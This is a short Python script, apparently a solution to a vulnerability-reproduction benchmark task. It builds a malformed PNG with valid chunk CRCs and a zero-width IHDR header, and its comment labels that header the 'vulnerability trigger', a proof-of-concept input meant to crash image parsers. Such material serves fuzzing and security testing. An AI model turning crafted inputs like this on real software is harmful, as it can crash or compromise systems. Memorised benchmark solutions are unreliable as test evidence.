import os
import struct
import zlib
from typing import Optional

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a PNG with zero width (vulnerability trigger)
        # PNG signature
        png_data = bytearray(b'\x89PNG\r\n\x1a\n')
        
        # IHDR chunk - zero width, non-zero height
        width = 0
        height = 100
        bit_depth = 8
        color_type = 2  # RGB
        compression = 0
        filter_method = 0
        interlace = 0
        
        ihdr_data = struct.pack('>IIBBBBB', width, height, bit_depth,
                              color_type, compression, filter_method, interlace)
        ihdr_chunk = self._make_chunk(b'IHDR', ihdr_data)
        png_data.extend(ihdr_chunk)
        
        # Create IDAT chunk with compressed image data
        # For zero width, we'll create minimal image data
        scanline = bytearray()  # No filter byte needed for zero width
        image_data = scanline * height
        
        # Compress the data
        compressed_data = zlib.compress(image_data)
        idat_chunk = self._make_chunk(b'IDAT', compressed_data)
        png_data.extend(idat_chunk)
        
        # IEND chunk
        iend_chunk = self._make_chunk(b'IEND', b'')
        png_data.extend(iend_chunk)
        
        return bytes(png_data)
    
    def _make_chunk(self, chunk_type: bytes, data: bytes) -> bytes:
        """Create a PNG chunk with CRC."""
        length = struct.pack('>I', len(data))
        chunk = chunk_type + data
        crc = struct.pack('>I', zlib.crc32(chunk) & 0xffffffff)
        return length + chunk + crc